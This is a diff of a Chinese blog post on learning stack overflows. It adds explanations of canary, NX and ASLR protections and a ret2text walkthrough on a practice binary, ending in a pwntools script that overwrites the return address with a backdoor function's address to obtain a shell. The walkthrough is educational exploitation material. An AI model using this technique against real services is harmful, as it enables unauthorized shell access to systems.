@@ -92,8 +92,18 @@
 <meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/1.png">
 <meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/2.png">
 <meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/3.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/6.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/8.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/9.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/16.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/10.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/11.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/12.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/13.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/14.png">
+<meta property="og:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/15.png">
 <meta property="article:published_time" content="2020-07-22T14:04:42.000Z">
-<meta property="article:modified_time" content="2020-07-30T01:40:21.789Z">
+<meta property="article:modified_time" content="2020-08-01T07:46:45.371Z">
 <meta property="article:author" content="song">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://songzzzz.xyz/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/4.jpeg">
@@ -366,6 +376,18 @@
 </blockquote>
 <p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/2.png" alt="alt"></p>
 <p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/3.png" alt="alt"></p>
+<h2 id="栈的保护机制"><a href="#栈的保护机制" class="headerlink" title="栈的保护机制"></a>栈的保护机制</h2><p>CANNARY(栈保护)</p>
+<blockquote>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+</blockquote>
+<p>NX（DEP）(数据执行保护 Data Execution Prevention)</p>
+<blockquote>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+</blockquote>
+<p>PIE（ASLR）</p>
+<blockquote>
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况：<br>0 - 表示关闭进程地址空间随机化<br>1 - 表示将mmap的基址，stack和vdso页面随机化<br>2 - 表示在1的基础上增加堆（heap）的随机化</p>
+</blockquote>
 <h2 id="栈溢出的利用思路"><a href="#栈溢出的利用思路" class="headerlink" title="栈溢出的利用思路"></a>栈溢出的利用思路</h2><blockquote>
 <ol>
 <li>先决条件：栈局部变量可控，存在溢出漏洞(strcpy、memcpy等)。</li>
@@ -373,6 +395,54 @@
 <li>Payload = [Nop sled + ] Shellcode + Pad + Shellcode’s Addr</li>
 </ol>
 </blockquote>
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>文件链接：<a href="https://share.weiyun.com/evUKkBCv" target="_blank" rel="noopener">https://share.weiyun.com/evUKkBCv</a></p>
+<p>首先讲一下栈溢出的一般思路，gdb打开程序，然后运行，输入一串字符，然后程序在某个地址发生错误。</p>
+<p>使用checksec ret2text查看程序的保护机制，这里发现啥都没有</p>
+<p>！<a href="7.png">alt</a></p>
+<p>使用cyclic 150 生成150个字符</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/6.png" alt="alt"></p>
+<p>运行程序，输入字符串，发现程序在0x61616166发生错误</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/8.png" alt="alt"></p>
+<p>使用cyclic -l 0x61616166计算偏移量(上述方法只适用于32位程序),得到偏移量20</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/9.png" alt="alt"></p>
+<p>通过gdb调试也可以看出偏移量是20</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/16.png" alt="alt"></p>
+<p>在ida中打开程序，找到main函数</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/10.png" alt="alt"></p>
+<p>进入到vulnerable函数，发现有个gets函数（gets函数是很不安全的）</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/11.png" alt="alt"></p>
+<p>然后搜索字符串，发现/bin/sh</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/12.png" alt="alt"></p>
+<p>/bin/sh的作用简而言之就是打开一个可以执行bash命令的命令行，所以当看到这个字符串时一定要重视</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/13.png" alt="alt"></p>
+<p>然后继续跟进的话，可以发现有个可以直接使用的后门函数</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/14.png" alt="alt"></p>
+<p>接下来就可以开始写exp了</p>
+<pre><code># 导入pwntools
+from pwn import *
+
+# 在本地运行ret2text
+p = process(&quot;./ret2text&quot;)
+# 远程执行的话如下
+# p = remote(&apos;127.0.0.1&apos;,8982)
+# 前面是ip地址，后面是端口号
+
+# 后门函数的地址
+address = 0x08048522
+
+# payload的构成，先填充20个垃圾字符，在用后门函数的地址覆盖返回地址
+payload = 0x14 * &apos;a&apos;.encode() + p32(address)
+
+# 上面是在python3下的写法，下面是python2下
+# payload = 0x14 * &apos;a&apos; + p32(address)
+
+# 发送payload
+p.sendline(payload)
+
+# 在终端里将命令传送到远程服务器
+p.interactive();</code></pre><p>如果对于exp中的命令不理解，可以看看这篇<a href="https://bbs.pediy.com/thread-247217.htm" target="_blank" rel="noopener">文章</a></p>
+<p>运行exp.py，利用成功</p>
+<p><img src="/2020/07/22/%E6%A0%881-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/15.png" alt="alt"></p>
 
       
     </div>
@@ -546,7 +616,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#必备基础"><span class="nav-number">1.</span> <span class="nav-text">必备基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件结构"><span class="nav-number">2.</span> <span class="nav-text">ELF文件结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件内存布局"><span class="nav-number">3.</span> <span class="nav-text">ELF文件内存布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于栈的举例说明"><span class="nav-number">4.</span> <span class="nav-text">关于栈的举例说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出的利用思路"><span class="nav-number">5.</span> <span class="nav-text">栈溢出的利用思路</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#必备基础"><span class="nav-number">1.</span> <span class="nav-text">必备基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件结构"><span class="nav-number">2.</span> <span class="nav-text">ELF文件结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件内存布局"><span class="nav-number">3.</span> <span class="nav-text">ELF文件内存布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于栈的举例说明"><span class="nav-number">4.</span> <span class="nav-text">关于栈的举例说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈的保护机制"><span class="nav-number">5.</span> <span class="nav-text">栈的保护机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出的利用思路"><span class="nav-number">6.</span> <span class="nav-text">栈溢出的利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实际利用"><span class="nav-number">7.</span> <span class="nav-text">实际利用</span></a></li></ol></div>
             
 
           </div>
